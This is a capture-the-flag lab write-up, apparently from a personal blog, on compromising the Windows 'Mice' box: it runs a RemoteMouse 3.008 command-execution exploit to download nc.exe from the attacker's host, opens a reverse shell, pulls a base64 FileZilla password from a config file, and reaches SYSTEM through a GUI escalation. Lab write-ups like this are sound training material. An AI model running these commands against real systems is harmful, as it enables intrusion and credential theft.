@@ -1,0 +1,117 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-gysqo7gh> <head><meta charset="utf-8"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v5.16.3"><title>Mice  PGP walkthrough - Your Portfolio</title><meta name="description" content="Target - Mice, OS - Windows"><script>
+      (function () {
+        const savedTheme = localStorage.getItem("theme") || "dark";
+        const prefersDark = window.matchMedia(
+          "(prefers-color-scheme: dark)"
+        ).matches;
+        const initialTheme =
+          savedTheme === "system"
+            ? prefersDark
+              ? "dark"
+              : "light"
+            : savedTheme;
+
+        if (initialTheme === "dark") {
+          document.documentElement.classList.add("dark");
+        } else {
+          document.documentElement.classList.remove("dark");
+        }
+      })();
+    </script><script type="module">document.addEventListener("DOMContentLoaded",function(){window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{localStorage.getItem("theme")==="system"&&(e.matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark"))});const t=document.querySelector(".prose");if(t){const e=t.querySelector("h1");e&&e.remove()}});</script><link rel="stylesheet" href="/_astro/about.xvh9vdT6.css">
+<style>html,body{margin:0;padding:0;height:100%;overflow-x:hidden}body{display:flex;flex-direction:column;min-height:100vh}main[data-astro-cid-gysqo7gh]{flex:1}section[data-astro-cid-gysqo7gh][class*=text-gray-700]{margin:0;padding:0;flex-shrink:0}.prose[data-astro-cid-gysqo7gh] h1[data-astro-cid-gysqo7gh]:first-of-type,.prose[data-astro-cid-gysqo7gh]>h1[data-astro-cid-gysqo7gh]:first-child,article[data-astro-cid-gysqo7gh] .prose[data-astro-cid-gysqo7gh] h1[data-astro-cid-gysqo7gh]:first-child{display:none!important}.dot-hexagon-light[data-astro-cid-gysqo7gh]{background-image:radial-gradient(circle,#80808045 1px,transparent 1px),radial-gradient(circle,#80808045 1px,transparent 1px);background-size:24px 41.57px;background-position:0 0,12px 20.78px}.dot-hexagon-dark[data-astro-cid-gysqo7gh]{background-image:radial-gradient(circle,#ffffff35 1px,transparent 1px),radial-gradient(circle,#ffffff35 1px,transparent 1px);background-size:24px 41.57px;background-position:0 0,12px 20.78px}
+</style></head> <body class="bg-white dark:bg-neutral-900 transition-colors duration-300" data-astro-cid-gysqo7gh> <div class="fixed inset-0 z-0 pointer-events-none" data-astro-cid-gysqo7gh> <div class="absolute inset-0 -z-10 dot-hexagon-light dark:dot-hexagon-dark" data-astro-cid-gysqo7gh></div> <div class="absolute inset-0 bg-[radial-gradient(ellipse_80%_80%_at_50%_50%,transparent_0%,rgba(255,255,255,0.5)_60%,rgba(255,255,255,0.9)_85%,white_100%)] dark:bg-[radial-gradient(ellipse_80%_80%_at_50%_50%,transparent_0%,rgba(23,23,23,0.5)_60%,rgba(23,23,23,0.9)_85%,rgb(23,23,23)_100%)] -z-10" data-astro-cid-gysqo7gh></div> <div class="absolute left-0 right-0 top-0 -z-10 m-auto h-[1200px] w-[1200px] rounded-full bg-neutral-400 opacity-10 blur-[100px]" data-astro-cid-gysqo7gh></div> </div> <main class="flex-1 relative z-10" data-astro-cid-gysqo7gh> <!-- Navigation Bar Component --><nav class="relative z-50"> <div class="container mx-auto px-4 sm:px-6 lg:px-8"> <div class="flex items-center justify-between h-16"> <a href="/" class="text-xl font-bold text-neutral-700 hover:text-neutral-400 dark:text-neutral-300 dark:hover:text-neutral-100 transition-colors"></a> <div class="flex items-center space-x-6"> <a href="/" class="text-neutral-600 hover:text-neutral-400 dark:text-neutral-400 dark:hover:text-neutral-200 transition-colors">Home</a> <a href="/posts/" class="text-neutral-600 hover:text-neutral-400 dark:text-neutral-400 dark:hover:text-neutral-200 transition-colors">CTF</a> <!-- <a
+          href="/projects/"
+          class="text-neutral-600 hover:text-neutral-400 dark:text-neutral-400 dark:hover:text-neutral-200 transition-colors"
+          >Projects</a
+        > --> <a href="/about/" class="text-neutral-600 hover:text-neutral-400 dark:text-neutral-400 dark:hover:text-neutral-200 transition-colors">About</a> <button id="theme-toggle" class="p-2 rounded-full text-neutral-600 hover:text-neutral-400 dark:text-neutral-400 dark:hover:text-neutral-200 transition-colors" title="Toggle theme"> <svg class="w-5 h-5 theme-icon-light hidden" fill="currentColor" viewBox="0 0 20 20"> <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z"></path> </svg> <svg class="w-5 h-5 theme-icon-dark hidden" fill="currentColor" viewBox="0 0 20 20"> <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path> </svg> </button> </div> </div> </div> </nav> <script type="module">document.addEventListener("DOMContentLoaded",function(){const t=document.getElementById("theme-toggle"),n=t.querySelector(".theme-icon-light"),c=t.querySelector(".theme-icon-dark");function o(e){e?(n.classList.add("hidden"),c.classList.remove("hidden")):(n.classList.remove("hidden"),c.classList.add("hidden"))}const s=document.documentElement.classList.contains("dark");o(s),t.addEventListener("click",function(){const e=document.documentElement.classList.contains("dark"),d=e?"light":"dark";document.documentElement.classList.toggle("dark"),o(!e),localStorage.setItem("theme",d)})});</script> <article class="relative z-20 w-[896px] mx-auto mt-24 mb-12 px-7 lg:px-0" data-astro-cid-gysqo7gh> <header class="text-center" data-astro-cid-gysqo7gh> <h1 class="text-2xl font-bold tracking-tight text-neutral-900 dark:text-neutral-100 sm:text-3xl lg:text-4xl mb-1.5" data-astro-cid-gysqo7gh> Mice  PGP walkthrough </h1> <div class="flex items-center justify-center gap-4 text-sm text-neutral-600 dark:text-neutral-400 mb-1.5" data-astro-cid-gysqo7gh> <time datetime="2025-12-12T00:00:00.000Z" data-astro-cid-gysqo7gh> December 12, 2025 </time> <span data-astro-cid-gysqo7gh>•</span> <span data-astro-cid-gysqo7gh>10 min read</span> </div> </header> <p class="text-lg text-neutral-600 dark:text-neutral-400 mb-16 text-center" data-astro-cid-gysqo7gh> Target - Mice, OS - Windows </p> <div class="prose prose-neutral dark:prose-invert max-w-none" data-astro-cid-gysqo7gh> <h1 id="enum">Enum</h1>
+<p>Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nmap -sVC -n -p- -T4 --open -Pn -oN Mice-nmap 192.168.118.199</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Nmap scan report for 192.168.118.199</span></span>
+<span class="line"><span>Host is up (0.32s latency).</span></span>
+<span class="line"><span>Not shown: 65531 filtered tcp ports (no-response)</span></span>
+<span class="line"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</span></span>
+<span class="line"><span>PORT     STATE SERVICE        VERSION</span></span>
+<span class="line"><span>1978/tcp open  remotemouse    Emote Remote Mouse</span></span>
+<span class="line"><span>1979/tcp open  unisql-java?</span></span>
+<span class="line"><span>1980/tcp open  pearldoc-xact?</span></span>
+<span class="line"><span>3389/tcp open  ms-wbt-server  Microsoft Terminal Services</span></span>
+<span class="line"><span>| ssl-cert: Subject: commonName=Remote-PC</span></span>
+<span class="line"><span>| Not valid before: 2025-12-02T17:03:21</span></span>
+<span class="line"><span>|_Not valid after:  2026-06-03T17:03:21</span></span>
+<span class="line"><span>|_ssl-date: 2025-12-21T12:44:17+00:00; -25s from scanner time.</span></span>
+<span class="line"><span>| rdp-ntlm-info: </span></span>
+<span class="line"><span>|   Target_Name: REMOTE-PC</span></span>
+<span class="line"><span>|   NetBIOS_Domain_Name: REMOTE-PC</span></span>
+<span class="line"><span>|   NetBIOS_Computer_Name: REMOTE-PC</span></span>
+<span class="line"><span>|   DNS_Domain_Name: Remote-PC</span></span>
+<span class="line"><span>|   DNS_Computer_Name: Remote-PC</span></span>
+<span class="line"><span>|   Product_Version: 10.0.19041</span></span>
+<span class="line"><span>|_  System_Time: 2025-12-21T12:43:48+00:00</span></span>
+<span class="line"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Host script results:</span></span>
+<span class="line"><span>|_clock-skew: mean: -25s, deviation: 0s, median: -25s</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>From the nmap scan results the service running on  port 1978 looked interesting.</p>
+<p>Ran searchsploit to find exploits if any exist and there is one</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>searchsploit 'emote remote mouse'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>RemoteMouse 3.008 - Arbitrary Remote Command Execution | windows/remote/46697.py</span></span></code></pre>
+<p>Searched for exploit and found this one to be clear.
+<a href="https://github.com/p0dalirius/RemoteMouse-3.008-Exploit">https://github.com/p0dalirius/RemoteMouse-3.008-Exploit</a></p>
+<hr>
+<h1 id="initial-access">Initial Access</h1>
+<p>Executed the exploit with required parameters.
+Hosted a server</p>
+<p>The exploit fetched the nc.exe from local and stored it under C:/Windows/Temp/nc.exe as mentioned. Curl is along with powershell  for —cmd parameter.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>python3 RemoteMouse-3.008-Exploit.py -t 192.168.118.199 --cmd 'powershell -c "curl http://192.168.45.179/nc.exe -o C:/Windows/Temp/nc.exe"`</span></span></code></pre>
+<p>Again executed the exploit to trigger the reverse shell.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>python3 RemoteMouse-3.008-Exploit.py -t 192.168.118.199 --v --cmd 'powershell -c "C:/Windows/Temp/nc.exe 192.168.45.179 80 -e cmd"'</span></span></code></pre>
+<p><img src="/assets/images/mice/exp.png" alt=""></p>
+<p>At local</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>rlwrap nc -lnvp 80</span></span></code></pre>
+<p>After the exploit executed reverse shell has be connected successfully.</p>
+<p><img src="/assets/images/mice/shell-divine.png" alt=""></p>
+<p>Got the local.txt under C:\Users\Divine\Desktop</p>
+<p><img src="/assets/images/mice/local.png" alt=""></p>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Earlier nmap scan results showed that FileZilla service exist which is a lead for further internal enumeration.</p>
+<p>Internal exploration revealed FileZilla was installed on the target.
+A web search about FileZilla credential location showed where it stores user password and that is  in  <code>/Appdata/FileZilla</code> directory</p>
+<p>Based on that search information while analyzing internal directories, files found a file named as recentserver.xml which contained a base64 encoded password under <code>C:\Users\divine\Appdata\Roaming\FileZilla></code></p>
+<p><img src="/assets/images/mice/filzilla.png" alt=""></p>
+<p>Further decoder the hash with base64 -d and found the password
+<img src="/assets/images/mice/hashed.png" alt=""></p>
+<p>Further logged into the system via rdesktop as user divine</p>
+<p><img src="/assets/images/mice/rdesk.png" alt=""></p>
+<p>Searched for exploit in searchsploit DB and mirrored the exploit. That is CVE-2021-35448.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>searchsploit remote mouse</span></span>
+<span class="line"><span>Remote Mouse GUI 3.008 - Local Privilege Escalation | windows/local/50047.txt</span></span>
+<span class="line"><span>searchsploit -m 50047.txt</span></span></code></pre>
+<p>The exploit has steps to reproduce.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Steps to reproduce:</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>1. Open Remote Mouse from the system tray</span></span>
+<span class="line"><span>2. Go to "Settings"</span></span>
+<span class="line"><span>3. Click "Change..." in "Image Transfer Folder" section</span></span>
+<span class="line"><span>4. "Save As" prompt will appear</span></span>
+<span class="line"><span>5. Enter "C:\Windows\System32\cmd.exe" in the address bar</span></span>
+<span class="line"><span>6. A new command prompt is spawned with Administrator privileges</span></span></code></pre>
+<p>Followed those steps in Remote Mouse GUI and cmd prompted as administrator.</p>
+<p><img src="/assets/images/mice/gui.png" alt=""></p>
+<p><code>whoami</code> showed the user as NT Authority\System
+Finally proof.txt was captured successfully under <code>C:\Users\Administrator\Desktop</code></p>
+<p><img src="/assets/images/mice/nt.png" alt="NT"></p>
+<hr>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>									Target compromised - |^| ^( |&#x3C; 3 D</span></span></code></pre> </div> </article> </main> <!-- Footer Component --><section class="relative text-gray-700 min-h-[60px]"> <div class="container mx-auto px-7 max-w-7xl
+           flex justify-center items-end"> <div class="flex items-center space-x-3
+             absolute bottom-0 pb-2
+             text-neutral-700 dark:text-neutral-300"> <a href="/posts" class="group flex items-center space-x-1.5 font-semibold"> <span class="text-xl -translate-y-0.5
+                 group-hover:scale-[1.1]
+                 transition-transform duration-300 ease-in-out">
+Dragon-CTF
+</span> <span class="-translate-y-0.5">Decoder</span> </a> <span class="opacity-60">|</span> <p class="text-sm">
+© 2025 All rights reserved.
+</p> </div> </div> </section> </body></html>
